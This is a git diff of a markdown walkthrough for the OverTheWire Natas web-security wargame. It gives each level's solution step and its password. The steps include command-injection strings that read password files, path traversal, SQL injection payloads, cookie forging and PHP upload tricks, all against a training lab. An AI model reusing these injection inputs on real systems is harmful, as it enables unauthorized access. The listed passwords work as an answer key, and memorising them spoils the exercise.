@@ -1,70 +1,70 @@
 # [The Natas wargame](https://overthewire.org/wargames/natas/)
-url: [Natas](http://natas0.natas.labs.overthewire.org)
-Username: natas0
+url: [Natas](http://natas0.natas.labs.overthewire.org)  
+Username: natas0  
 Password: natas0
 
 ### Level 0 → Level 1
-Check in the comments
-**password:**
+Check in the comments  
+**password:**  
 gtVrDuiDfck831PqWsLEZy5gyDz1clto
 
 ### Level 1 → Level 2
-F12...
-**password:**
+F12...  
+**password:**  
 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 
 ### Level 2 → Level 3
-Add /files to url
-**password:**
+Add /files to url  
+**password:**  
 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 
 ### Level 3 → Level 4
-See /robots.txt file
--> /s3cr3t
-**password:**
+See /robots.txt file  
+-> /s3cr3t  
+**password:**  
 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
 ### Level 4 → Level 5
-Reffer from natas5
-**password:**
+Reffer from natas5  
+**password:**  
 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
 ### Level 5 → Level 6
-Change loggedin cookie to 1
-**password:**
+Change loggedin cookie to 1  
+**password:**  
 aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 
 ### Level 6 → Level 7
-Add /includes/secret.inc to url
--> Insert FOEIUWGHFEEUHOFUOIU in textbox
--> 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
-**password:**
+Add /includes/secret.inc to url  
+-> Insert FOEIUWGHFEEUHOFUOIU in textbox  
+-> 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9  
+**password:**  
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 
 ### Level 7 → Level 8
-page=/etc/natas_webpass/natas8
-**password:**
+page=/etc/natas_webpass/natas8  
+**password:**  
 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 ### Level 8 → LeveL 9
-Using [PHP sandbox](https://sandbox.onlinephpfunctions.com/)
+Using [PHP sandbox](https://sandbox.onlinephpfunctions.com/)  
 ```php
 echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))); 
 ```  
--> oubWYf2kBq
--> Insert to textbox
--> W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
-**password:**  
+-> oubWYf2kBq  
+-> Insert to textbox  
+-> W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl  
+**password:**    
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 ### Level 9 → Level 10
-Insert ';cat /etc/natas_webpass/natas10'
-**password:**
+Insert ';cat /etc/natas_webpass/natas10'  
+**password:**  
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 
 ### Level 10 → Level 11
-Insert '.* /etc/natas_webpass/natas11 #'
-**password:**
+Insert '.* /etc/natas_webpass/natas11 #'  
+**password:**  
 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 ### Level 11 → Level 12
@@ -97,9 +97,9 @@ Now get the good cookie:
  $d = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
  print base64_encode(xor_encrypt(json_encode($d)));
 ```
--> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
-set 'data' cookie to this cookie
-**password:**
+-> ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
+set 'data' cookie to this cookie  
+**password:**  
 EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
 ### Level 12 → Level 13  
@@ -111,8 +111,8 @@ Create php file (a.php for example):
 ```
 change the filename value html tag to 'a.php'
 -> <input type="hidden" name="filename" value="a.php">
-Upload file and click on the link
-**password:**  
+Upload file and click on the link  
+**password:**    
 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
   
 ### Level 13 → Level 14  
@@ -130,23 +130,24 @@ Merge the files
 ```shell
 cat a b > c.php
 ```
-Upload like previous level and click link
-**password:**  
+Upload like previous level and click link  
+**password:**    
 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  
 
 ### Level 14 → Level 15
-Simple SQL injection
-Username: natas15
-Password: " OR ""="
-**password:**
+Simple SQL injection  
+Username: natas15  
+Password: " OR ""="  
+**password:**  
 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  
   
 ### Level 15 → Level 16
 Basic Blind SQL injection, 64 char max password, we need to do 2 thing to get the password:  
 1. Get the character set (to reduce the complexity of the brute force)
-2. Brute force  
-Use [this](https://gist.github.com/bom2013/d3a3e83d165209de8164a41c0b74703a) python script to do it
-**password:**  
+2. Brute force 
+
+Use [this](https://gist.github.com/bom2013/d3a3e83d165209de8164a41c0b74703a) python script to do it  
+**password:**    
 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  
 
 ### Level 16 → Level 17
